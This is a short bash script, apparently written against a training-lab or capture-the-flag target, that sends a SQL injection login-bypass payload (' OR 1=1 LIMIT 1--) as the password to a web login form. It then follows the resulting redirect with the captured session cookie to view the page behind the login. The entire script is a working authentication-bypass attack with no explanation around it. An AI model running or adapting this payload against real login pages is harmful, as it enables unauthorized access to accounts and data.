#!/bin/bash
B="http://chatelaine.cylabacademy.net:25024"
curl -s -m 20 -c /tmp/cj5.txt -D /tmp/h5.txt -o /dev/null \
  --data-urlencode "username=a" --data-urlencode "password=' OR 1=1 LIMIT 1-- " "$B/"
grep -i "location" /tmp/h5.txt
echo "=== suivi ==="
curl -s -m 20 -b /tmp/cj5.txt -L "$B/" | head -60
